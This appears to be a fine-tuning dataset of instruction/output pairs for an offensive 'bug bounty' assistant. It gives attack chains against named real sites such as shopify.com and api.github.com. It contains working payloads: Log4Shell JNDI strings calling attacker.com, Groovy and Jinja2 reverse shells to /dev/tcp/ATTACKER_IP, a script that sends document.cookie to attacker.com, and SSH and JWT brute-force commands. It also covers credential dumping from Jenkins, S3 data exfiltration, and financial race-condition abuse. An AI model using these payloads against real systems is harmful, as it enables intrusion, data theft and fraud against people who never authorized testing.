instruction: Target: shopify.com | Tech: Ruby on Rails, PostgreSQL | WAF: Cloudflare | Ports: 443,80
output:
ATTACK CHAIN:
1. IDOR in /admin/orders/{id} — try sequential IDs with your session token
2. Mass assignment in PUT /api/customers/{id} — add role:admin to JSON body
3. Race condition on discount codes — send 50 concurrent POST /cart/apply_coupon requests
4. GraphQL introspection at /api/graphql — dump full schema, find admin mutations
5. SSRF via webhook URL parameter — test http://169.254.169.254/latest/meta-data/

PRIORITY TOOLS: nuclei -t cves/ -u https://shopify.com, then paramspider -d shopify.com, then dalfox url https://shopify.com

WAF BYPASS: Use X-Forwarded-For: 127.0.0.1 header + chunked encoding for payloads

LOG4SHELL CONFIRMED. Immediate exploitation:

1. Verify RCE: curl 'https://api.target.com/search?q=${jndi:ldap://YOUR_INTERACTSH_URL/a}' -H 'User-Agent: ${jndi:ldap://YOUR_INTERACTSH_URL/b}'

2. If callback received, get reverse shell:
   Payload: ${jndi:ldap://attacker.com:1389/Exploit}
   Listener: java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://attacker.com:8888/#Exploit'

3. Test ALL headers: User-Agent, X-Forwarded-For, X-Api-Version, Referer, Accept-Language

4. Run Abhimanyu mode: cybermind /abhimanyu api.target.com rce

SEVERITY: Critical (CVSS 10.0) — report immediately to HackerOne

instruction: Target: api.github.com | Tech: Ruby, Redis | Auth: OAuth 2.0 | Found: /user endpoint returns email
output:
OAUTH ATTACK CHAIN:

1. Missing state parameter test:
   GET /login/oauth/authorize?client_id=CLIENT&redirect_uri=https://attacker.com&scope=user
   If no state= required → CSRF account takeover

2. redirect_uri bypass:
   Try: redirect_uri=https://github.com.attacker.com
   Try: redirect_uri=https://github.com@attacker.com
   Try: redirect_uri=https://github.com%2F@attacker.com

3. Scope escalation:
   Add scope=admin:org,delete_repo,write:packages to authorization URL
   Check if server accepts without error

4. Token leakage via Referer:
   If implicit flow: access_token appears in URL → check if logged in Referer headers

5. PKCE downgrade:
   Remove code_challenge from authorization request
   If server accepts → authorization code interception possible

TOOL: jwt_tool -t TOKEN -X a (algorithm confusion test)

instruction: S3 bucket found: company-backup.s3.amazonaws.com returns 200 with ListBucketResult
output:
CRITICAL S3 MISCONFIGURATION CONFIRMED!

Immediate steps:
1. List all files: aws s3 ls s3://company-backup --no-sign-request --recursive
2. Download sensitive files: aws s3 cp s3://company-backup/database.sql . --no-sign-request
3. Check for write access: aws s3 cp test.txt s3://company-backup/ --no-sign-request
4. Search for credentials: aws s3 ls s3://company-backup --no-sign-request | grep -i 'config\|secret\|key\|password\|credential'
5. Run TruffleHog: trufflehog s3 --bucket=company-backup

REPORT TEMPLATE:
Title: Public S3 Bucket Exposes Sensitive Data
Severity: Critical
Impact: All files in s3://company-backup are publicly readable. This may include database backups, credentials, source code, and customer PII.
PoC: curl https://company-backup.s3.amazonaws.com/ → returns file listing
Remediation: Set bucket ACL to private, enable Block Public Access

instruction: Target: payment.example.com | Found: POST /api/checkout with price=99.99 in JSON body
output:
BUSINESS LOGIC ATTACK — PRICE MANIPULATION:

1. Negative price:
   POST /api/checkout
   {"items":[{"id":1,"price":-99.99,"qty":1}]}
   Expected: Server should reject. If order completes → critical bug

2. Zero price:
   {"items":[{"id":1,"price":0,"qty":1}]}

3. Integer overflow:
   {"items":[{"id":1,"price":99.99,"qty":2147483647}]}
   Total may overflow to negative

4. Currency manipulation:
   Add "currency":"VND" to request (1 USD = 24,000 VND)
   If server charges in VND but delivers USD value → critical

5. Race condition on checkout:
   Send 10 concurrent POST /api/checkout requests simultaneously
   Use Burp Turbo Intruder or: for i in {1..10}; do curl -X POST ... &; done

6. Coupon stacking:
   Apply same coupon code 10 times via concurrent requests

TOOL: cybermind /bizlogic payment.example.com --cookie 'session=YOUR_TOKEN'

instruction: APK decompiled. Found in MainActivity.java: String API_KEY = "AIzaSyD-9tSrke72I3xi2X4a6bB8sYzMTyug5Ys"; String FIREBASE_URL = "https://myapp-default-rtdb.firebaseio.com";
output:
CRITICAL HARDCODED SECRETS FOUND!

1. Google API Key exposed:
   Key: AIzaSyD-9tSrke72I3xi2X4a6bB8sYzMTyug5Ys
   Test scope: curl 'https://maps.googleapis.com/maps/api/geocode/json?address=test&key=AIzaSyD-9tSrke72I3xi2X4a6bB8sYzMTyug5Ys'
   Check enabled APIs: https://console.cloud.google.com/apis/credentials
   Potential abuse: Maps API billing fraud, Firebase access, Cloud Storage

2. Firebase database exposed:
   Test public read: curl 'https://myapp-default-rtdb.firebaseio.com/.json'
   If returns data → full database dump possible
   Test write: curl -X PUT 'https://myapp-default-rtdb.firebaseio.com/test.json' -d '"hacked"'

3. Extract all endpoints from APK:
   grep -r 'https://' /tmp/jadx_output/ | grep -v 'schema\|example\|w3.org'

4. SSL pinning bypass for dynamic testing:
   frida -U -f com.myapp --no-pause -l ssl_bypass.js
   Then route through ZAP: cybermind /zap https://api.myapp.com full

SEVERITY: Critical — report to HackerOne with full PoC

GRAPHQL ATTACK CHAIN:

1. Full schema dump:
   curl -X POST https://graphql.example.com/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}'

2. Find admin mutations:
   Look for: deleteUser, updateRole, createAdmin, resetPassword, grantPermission

3. IDOR via direct object access:
   query { user(id: 2) { email password ssn creditCard } }
   query { order(id: 1001) { user { email } items { price } } }

4. Batching attack (rate limit bypass):
   [{"query":"mutation{login(user:'admin',pass:'password1')}"},
    {"query":"mutation{login(user:'admin',pass:'password2')}"},
    ... x1000]
   This bypasses rate limiting — brute force in single request

5. Alias attack (IDOR enumeration):
   { u1:user(id:1){email} u2:user(id:2){email} u3:user(id:3){email} }

6. Nested query DoS:
   { user { friends { friends { friends { friends { name } } } } } }

TOOL: graphw00f -d -t https://graphql.example.com/graphql

instruction: Recon complete on target.com. Tech: WordPress 6.2, PHP 8.1, MySQL. WAF: None. Subdomains: 47 found. Open ports: 22,80,443,3306
output:
WORDPRESS ATTACK CHAIN (no WAF — go aggressive):

1. User enumeration (always works on WP):
   curl https://target.com/wp-json/wp/v2/users
   wpscan --url https://target.com --enumerate u

2. Plugin vulnerability scan:
   wpscan --url https://target.com --enumerate ap --plugins-detection aggressive --api-token YOUR_TOKEN
   nuclei -u https://target.com -t wordpress/ -severity critical,high

3. xmlrpc.php brute force amplification:
   POST /xmlrpc.php with 1000 login attempts in single request
   <methodCall><methodName>system.multicall</methodName>...

4. MySQL direct access (port 3306 open!):
   mysql -h target.com -u root -p (try empty password, 'root', 'password')
   If accessible → dump all databases

5. SSH brute force (port 22):
   hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt target.com ssh -t 16 -f

6. Subdomain takeover check (47 subdomains):
   for sub in $(cat subdomains.txt); do curl -s https://$sub | grep -i 'NoSuchBucket\|not found\|github pages'; done

PRIORITY: MySQL port 3306 open is critical — check immediately

instruction: Found: POST /api/transfer with body {"from_account":"ACC001","to_account":"ACC002","amount":100}. User has $500 balance.
output:
FINANCIAL RACE CONDITION ATTACK:

1. Negative transfer (get money):
   POST /api/transfer {"from":"ACC001","to":"ACC002","amount":-500}
   If accepted → balance increases instead of decreases

2. Race condition (transfer more than balance):
   Send 10 concurrent requests simultaneously:
   for i in {1..10}; do curl -X POST https://target.com/api/transfer -d '{"from":"ACC001","to":"ACC002","amount":500}' -H 'Cookie: session=TOKEN' &; done; wait
   If balance goes negative → critical race condition

3. Decimal precision attack:
   Transfer $0.001 repeatedly — some systems round down, attacker gets free money

4. IDOR on account ID:
   Change from_account to other users' account IDs
   Try: ACC001, ACC002, ACC003... or UUID enumeration

5. Integer overflow:
   amount: 9999999999999999 → may overflow to negative

SEVERITY: Critical — financial impact. Report immediately.
Bounty potential: $5,000-$50,000 depending on program

instruction: Target: jenkins.internal.company.com | Port 8080 open | No auth required on /script endpoint
output:
JENKINS UNAUTHENTICATED RCE — CRITICAL!

1. Verify RCE via Script Console:
   curl -X POST http://jenkins.internal.company.com:8080/script --data 'script=println("id".execute().text)'
   Expected output: uid=1000(jenkins) gid=1000(jenkins)

2. Get reverse shell:
   Payload: println(["bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"].execute().text)
   Listener: nc -lvnp 4444

3. Dump credentials from Jenkins:
   println(new File('/var/jenkins_home/secrets/master.key').text)
   println(new File('/var/jenkins_home/credentials.xml').text)

4. Access all build logs (may contain secrets):
   curl http://jenkins.internal.company.com:8080/api/json?tree=jobs[name,builds[number,result]]

5. Pivot to internal network:
   Jenkins has access to all deployment targets — enumerate SSH keys, AWS credentials

SEVERITY: Critical (CVSS 10.0) — unauthenticated RCE on internal infrastructure
This is a P1 bug — report immediately

instruction: HTTP Request Smuggling test on target.com. Server: nginx + Apache backend. Found: CL.TE discrepancy
output:
HTTP REQUEST SMUGGLING CONFIRMED (CL.TE)!

PoC:
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

Exploitation:
1. Bypass access controls:
   Smuggle request to /admin, /internal, /.env
   The backend sees the smuggled request as coming from localhost

2. Capture other users' requests:
   POST / HTTP/1.1
   Content-Length: 200
   Transfer-Encoding: chunked
   
   0
   
   POST /capture HTTP/1.1
   Host: target.com
   Content-Length: 500
   
   [victim's request gets appended here]

3. Web cache poisoning via smuggling:
   Smuggle a request that poisons the cache with malicious response

TOOL: python3 /opt/smuggler/smuggler.py -u https://target.com
SEVERITY: High — can lead to account takeover, access control bypass

JWT ATTACK CHAIN:

1. Algorithm confusion (RS256 → HS256):
   Decode header: {"alg":"RS256","typ":"JWT"}
   Get public key from: /.well-known/jwks.json or /api/auth/public-key
   Sign new token with public key as HMAC secret:
   jwt_tool TOKEN -X k -pk public_key.pem

2. Algorithm none bypass:
   Forge token with alg:none:
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
   (empty signature)

3. Privilege escalation:
   Decode payload: {"user":"john","role":"user"}
   Change role to admin and re-sign

4. JWT secret brute force:
   hashcat -a 0 -m 16500 TOKEN /usr/share/wordlists/rockyou.txt
   jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt

5. kid injection (SQL/path traversal in kid header):
   {"alg":"HS256","kid":"../../dev/null"}
   Sign with empty string as secret

TOOL: jwt_tool eyJhbGci... -T (tamper mode)

instruction: Target: app.example.com | Tech: Django 3.2, Python | Template engine: Jinja2 | Found: /search?q=test
output:
SSTI (SERVER-SIDE TEMPLATE INJECTION) ATTACK:

1. Detection:
   /search?q={{7*7}} → if response contains 49 → SSTI confirmed
   /search?q={{7*'7'}} → if response contains 7777777 → Jinja2 confirmed

2. Read environment variables (secrets):
   {{config.items()}} → dumps all Django settings including SECRET_KEY
   {{config['SECRET_KEY']}} → direct secret key extraction

3. RCE via Jinja2:
   {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
   
   Simpler: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

4. Read files:
   {{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0]}}

5. Reverse shell:
   {{''.__class__.__mro__[1].__subclasses__()[396]('bash -i >& /dev/tcp/ATTACKER/4444 0>&1',shell=True)}}

TOOL: tplmap -u 'https://app.example.com/search?q=*' --os-shell
SEVERITY: Critical — RCE via template injection

instruction: Recon on target.com complete. No bugs found after standard hunt. WAF: Cloudflare. Tech: React SPA, Node.js API.
output: SECOND-PASS DEEP HUNT STRATEGY (WAF bypass + novel attacks): 1. WAF bypass techniques for Cloudflare: - Add headers: X-Forwarded-For: 127.0.0.1, CF-Connecting-IP: 127.0.0.1 - Use Googlebot UA: Mozilla/5.0 (compatible; Googlebot/2.1) - Chunked encoding: Transfer-Encoding: chunked - Unicode normalization: 2. React SPA specific attacks: - DOM XSS in URL fragments: /# - React dangerouslySetInnerHTML injection - Client-side routing bypass: /admin#/ vs /admin 3. Node.js specific: - Prototype pollution: GET /?__proto__[admin]=true - Path traversal: /static/../../../etc/passwd - SSRF via axios/fetch: ?url=http://169.254.169.254/ 4. API endpoint discovery: - Run: subjs -i https://target.com | xargs -I{} curl -s {} | grep -oP '/api/[a-zA-Z0-9/_-]+' - Check /api/v1/, /api/v2/, /graphql, /rest/ 5. Web cache poisoning: - Add X-Forwarded-Host: attacker.com to requests - Check if response is cached with poisoned host 6. Run ZAP active scan: cybermind /zap https://target.com active MINDSET: Standard tools found nothing because WAF blocked them. Think sideways.

SUBDOMAIN TAKEOVER CONFIRMED — AWS S3!

The CNAME for staging.company.com points to an S3 bucket that no longer exists.

Exploitation:
1. Create AWS account (free tier)
2. Create S3 bucket named exactly: staging.company.com
   aws s3 mb s3://staging.company.com --region us-east-1
3. Enable static website hosting:
   aws s3 website s3://staging.company.com --index-document index.html
4. Upload malicious content:
   echo '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>' > index.html
   aws s3 cp index.html s3://staging.company.com/ --acl public-read
5. Verify: curl https://staging.company.com → serves your content

IMPACT:
- Cookie theft from users visiting staging.company.com
- Phishing attacks using trusted company domain
- If staging shares cookies with production → account takeover

SEVERITY: High (can be Critical if cookie sharing confirmed)
Bounty: $500-$5,000 depending on program
